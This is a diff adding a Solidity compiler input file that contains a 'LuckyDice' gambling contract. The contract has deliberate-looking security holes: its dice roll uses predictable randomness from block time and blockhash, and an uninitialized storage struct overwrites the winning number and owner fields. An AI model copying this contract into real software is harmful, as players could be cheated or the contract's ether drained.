@@ -1,0 +1,29 @@
+{
+  "language": "Solidity",
+  "settings": {
+    "libraries": {},
+    "metadata": {
+      "useLiteralContent": true
+    },
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "remappings": [],
+    "outputSelection": {
+      "*": {
+        "*": [
+          "*"
+        ],
+        "": [
+          "*"
+        ]
+      }
+    }
+  },
+  "sources": {
+    "LuckyDice.sol": {
+      "content": "pragma solidity ^0.4.26;\r\n\r\ncontract LuckyDice {\r\n    uint8 private winningNumber;\r\n    address public owner;\r\n\r\n    struct CasinoPlayer {\r\n        address addr;\r\n        uint256 ethr;\r\n    }\r\n\r\n    CasinoPlayer[] cPlayers;\r\n\r\n    constructor() public {\r\n        owner = msg.sender;\r\n        winningNumber = 7;\r\n    }\r\n\r\n    function roll() public payable{\r\n        require(msg.value >= 0.001 ether);\r\n        CasinoPlayer currentPlayer;\r\n        currentPlayer.addr = msg.sender;\r\n        currentPlayer.ethr = msg.value;\r\n        cPlayers.push(currentPlayer);\r\n        uint8 currentRoll = uint8(sha3(now, blockhash(block.number-1))) % 12 + 1;\r\n        if (currentRoll == winningNumber) {\r\n            msg.sender.transfer(this.balance);\r\n        }\r\n    }\r\n\r\n    function kill() public {\r\n        if (msg.sender == owner) {\r\n            selfdestruct(msg.sender);\r\n        }\r\n    }\r\n\r\n}"
+    }
+  }
+}
